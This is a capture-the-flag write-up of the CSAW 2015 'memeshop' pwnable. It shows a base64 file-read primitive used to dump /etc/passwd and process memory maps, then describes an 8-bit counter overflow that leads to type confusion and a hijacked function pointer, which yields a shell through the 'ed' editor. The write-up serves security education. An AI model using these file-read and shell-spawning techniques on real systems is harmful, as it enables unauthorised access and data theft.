'memeshop' was a pwnable worth 400 points in the latest CSAW CTF.

## Gathering Information
We are only given an ip/port to connect to, no binary was provided. After connecting we see a menu like this:

{% highlight php %}
so... lets see what is on the menu
[p]rint receipt from confirmation number
[n]ic cage (RARE MEME)
[d]erp
d[o]ge (OLD MEME, ON SALE)
[f]ry (SHUT UP AND LET ME TAKE YOUR MONEY)
n[y]an cat
[l]ike a sir
[m]r skeletal (doot doot)
[t]humbs up
t[r]ollface.jpg
[c]heck out
[q]uit

{% endhighlight %}

Most options will simply output a meme, but there is some interesting ones though. With `p` we can print a receipt and it will ask for an order number:

{% highlight php %}
ok, let me know your order number bro: 
> 123
sry br0, i have no records of that
{% endhighlight %}

We can get the order number if we use the `c`heck out option, which will output it base64 encoded:

{% highlight php %}
ur receipt is at L3RtcC9tZW1lMjAxNTA5MjItNjAyNy01ZXVoN3I=
---
b64decode: /tmp/meme20150922-6027-5euh7r
{% endhighlight %}

As we can see the base64 decoded string is simply a path to a temporary file. With these information one can assume that the `p`rint receipt option will probably open the file and read the content. And that is exactly what it does. If we provide */etc/passwd* base64 encoded to `p`rint receipt, we will get the output:

{% highlight php %}

ok, let me know your order number bro: L2V0Yy9wYXNzd2Q= 
ok heres ur receipt or w/e
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
[...]

{% endhighlight %}

## Dumping Files

Ok so we can dump arbitrary files with this primitive. Next step would be to dump the binary so we can reverse engineer it and find a way to actually exploit it. To dump the binary we can simply read from */proc/self/exe*. Doing so, we will receive a binary, but in fact it is the ruby interpreter. To find the actual ruby script that is running we can first check */proc/self/cmdline* which will return `rubymemeshop.rb`. Afterwards it's a matter of consulting /etc/passwd and /home/ctf/.bash_history to find where the script is located (you might also just use /proc/self/cwd):

{% highlight ruby %}
[..]
require_relative './plugin/mememachine.so'

include MemeMachine

[...]

def skeletal
        @meme_count = @meme_count + 1
        puts IO.read "./memes/skeleton.meme"
        puts "so... what do you say to mr skeletal?"
        str = gets
        puts addskeletal Base64.decode64 str
end

[..,]
def domeme name
        @meme_count = @meme_count + 1
        meme = IO.read name
        puts meme
        addmeme
end 

[...]

quit= false
while not quit
        print_menu
        val = gets.chomp
        case val[0]
        when 'q'
                quit = true
                next
        when 'p'
                print_receipt
                next
        when 'o'
                domeme "./memes/doge.meme"
                next

        [...]

        when 'm'
                skeletal
                next

        [...]
{% endhighlight %}

I have removed the unimportant parts of the script, but you can find the complete script [here](https://github.com/kitctf/writeups/blob/master/csaw-2015/memeshop/memeshop.rb).

 Ok the script itself does not provide anything interesting for exploitation. However, we notice that an extension called *mememachine.so* is loaded and the *skeletal* meme is obviosly calling an `addskeletal` method which must be located inside the extension. Furthermore each meme is calling the `addmeme` method. Next step was dumping the extension and reversing it.

## Reversing the extension 


![threemethods](http://i.imgur.com/xC9Xi5u.png)

We notice above three methods in IDA: `method_addmeme`, `method_addskeletal` and `method_checkout`. Let's checkout how a meme is added:

![addmeme](http://i.imgur.com/9nGD6uX.png)

First we notice `types_ptr` and `memerz_ptr`. Upon further inspection, we find out that pointers to the memes are kept in a 256 elements array to which `memerz_ptr` is pointing to, and that there is another array of same size keeping track of the type of the meme. This array is pointed to by `types_ptr`. Furthermore, `types_tracker_ptr` and `counter_ptr` are pointers to counters, which tell us how many elements we have in those two arrays respectively. As you can see in the disassembly, this method basically allocates memory for a new meme and adds the memory pointer to the array, sets its type to `0` and then increments both counters. And it writes a function address (`gooder_ptr`) to the meme structure at offset 8! This will be important soon.

If there is a type `0` meme, there must also be a type `1` meme, which is added by the `method_addskeletal` method:

![skeletal](http://i.imgur.com/ROAVP0p.png)

Ok this is a bit different. Here we provide the method a string argument (not on screenshot; you are prompted to provide this when you are trying to add a skelet). Of this string argument the first 128 characters are copied over to the new meme. Then the method continues similar the `method_addmeme` method. It writes the pointer to the new meme's memory into the `memes` array (pointed to by `memerz_ptr`) and sets its type to `1` this time. Then it also adds a function pointer, but this time at offset 264. (to which function this points depends on whether you provided *thanks mr skeletal* as argument to the method, but it is irrelevant to the exploitation).


![checkout](http://i.imgur.com/bPrW4oD.png)

And the final function `method_checkout` will then iterate over all memes and call the function pointers in each meme. Depending on whether it is a type `0` or type `1` meme, it will call different offsets in the meme structure (either offset 8 or offset 264). Even though we have not found the bug yet, it is rather obvious that we will have to get the service to confuse two memes, so that we actually control the function address being called: We control the first 128 bytes of the type `1` meme, and the type `0` meme has its function pointer at offset 8. 

The bug is quite subtle, but if you look closely, you will notice the following:

![bug1](http://i.imgur.com/wIEH5vA.png)

and

![bug2](http://i.imgur.com/B1vMbJG.png)

Do you see the bug? The meme-`counter` is defined as `byte`, while the `types_tracker` is defined as `int`. Why is this a problem? Well, let's assume we are very motivated and add 256 memes. The counter for the types will be fine and will be set to 256, but the counter for the memes can not hold 256 as value as it is only 8 bits large! Hence it overflows and the value will be 0! With the 257th meme we will actually be overwriting the first meme again! But this time, the type will not be set for the first meme, but will be set actually for the 257th:

{% highlight php %}
Before adding the 256th meme:

                              meme_ctr
                                  | 
                                  v
       ---------------         -------
memes  | 0 |  1  | 2 |  .....  | 255 |  
       ---------------         -------

                             types_tracker
                                  |
                                  v
       ---------------         -------
types  | 0 |  1  | 2 |  .....  | 255 |  
       ---------------         -------


After adding one more meme:

     meme_ctr
         | 
         v
       ---------------         -------
memes  | 0 |  1  | 2 |  .....  | 255 |  
       ---------------         -------

                                     types_tracker
                                         |
                                         v
       ---------------         -------
types  | 0 |  1  | 2 |  .....  | 255 |  
       ---------------         -------
{% endhighlight %}

## Exploitation

The strategy now: First add a meme type `0`. Then fill up 255 more memes to trigger the overflow in the counters. Finally add a type `1` meme with a custom function pointer at offset 8 (remember we control the first 128 bytes!) and then call `checkout`. The service will think the first meme is a type `0` meme and will call our custom function :)

Easy peasy, we just need to jump to `system` in libc now. For this we have to leak the libc base address. No problem, we have the file read primitive from the beginning and can just read `/proc/self/maps` which will give us the mapped memory for the current process:

{% highlight php %}

{% endhighlight %}
                            
Extract the base address, add the system offset (if we don't know which libc is used, we can also just dump the libc using the file read primitive again) and we are good to go, right? Not quite, we still need our `/bin/sh` argument for system. Lucky enough for us, the `method_checkout` loads an argument from offset 16:


![argument](http://i.imgur.com/pWRKX08.png)

Unlucky for us though, it does not load it into `rdi` but into `edi`, meaning the high 4 bytes will be set to 0. The 4 MSB of libc addresses are not 0 though! We can not use the `/bin/sh` string from the libc. What can we do? Well we need to find a `/bin/sh` string in memory that has 0's on the 4 MSB. Candidates are only the ruby binary and the heap as you can see above. We do control strings on the heap, so we can just spray the heap and hope to guess the correct offsets. But there is a more elegant solution. We don't actually need a `/bin/sh` string. We can spawn a shell with simply a `'ed\0'` or `'ed '` string. This opens a vim-like text editor and you can then execute commands via `!cat /etc/passwd`. And it is really *easy* to find an `ed` string in any binary. You can take any that you like from the ruby binary :)

The final exploit:

{% endhighlight %}

I have added some comments which should explain the exploit. The exploit is really not complicated, the hard part was spotting the integer overflow in my opinion. Finally here is the exploit in action:

{% highlight php %}
python exploit.py
go >
!id
uid=1001(ctf) gid=1001(ctf) groups=1001(ctf)
!cat /*/*/flag
flag{dwn: please tell us your meme. I'm not going to stop asking}
{% endhighlight %}

Remember you need to preceed your shell commands with an exclamation mark since you are in an ed session!

The final exploit can be found [here](https://github.com/kitctf/writeups/blob/master/csaw-2015/memeshop/exploit.py) the extension [here](https://github.com/kitctf/writeups/blob/master/csaw-2015/memeshop/mememachine.so) and the ruby script [here](https://github.com/kitctf/writeups/blob/master/csaw-2015/memeshop/memeshop.rb).


PS: I was told there is also a cool ruby method which basically opens a shell and to which you can directly jump to instead of system. I was not aware of that, but that would make the exploit even simpler. But the "ed" trick is a good one to know anyway :)
